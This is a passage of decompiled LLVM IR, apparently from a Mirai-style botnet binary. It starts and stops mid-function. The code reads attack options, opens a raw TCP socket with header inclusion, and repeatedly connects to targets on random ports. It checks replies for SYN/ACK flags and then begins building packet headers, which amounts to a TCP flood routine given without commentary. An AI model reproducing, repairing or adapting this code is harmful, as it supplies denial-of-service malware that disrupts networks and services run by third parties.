  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v4_b734 = mul i32 %v1_b72c, 256
  %v4_b738 = mul i32 %v0_b71c, 16777216
  %v5_b734 = or i32 %v4_b734, %v4_b738
  %v5_b738 = or i32 %v5_b734, %v5_b728
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v3_b784 = udiv i32 %v3_b77c, 16777216
  %v1_b788 = and i32 %v3_b77c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  %v1_b780 = udiv i32 %v3_b77c, 256
  %v4_b78c = and i32 %v1_b780, 65280
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v4_b794 = mul i32 %v1_b788, 256
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v4_b7a0 = mul i32 %v3_b77c, 16777216
  %v5_b78c = or i32 %v4_b7a0, %v3_b784
  %v5_b794 = or i32 %v5_b78c, %v4_b78c
  %v5_b7a0 = or i32 %v5_b794, %v4_b794
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  %v3_b7b0 = udiv i32 %v3_b7a8, 16777216
  %v1_b7b4 = and i32 %v3_b7a8, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v4_b7b8 = udiv i32 %v1_b7ac, 256
  %v4_b7bc = mul i32 %v1_b7b4, 256
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v4_b7c4 = mul i32 %v3_b7a8, 16777216
  %v5_b7b8 = or i32 %v4_b7c4, %v3_b7b0
  %v5_b7bc = or i32 %v5_b7b8, %v4_b7b8
  %v5_b7c4 = or i32 %v5_b7bc, %v4_b7bc
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* @r0, align 4
  %v0_b7e0 = call i32 @malloc()
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v0_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
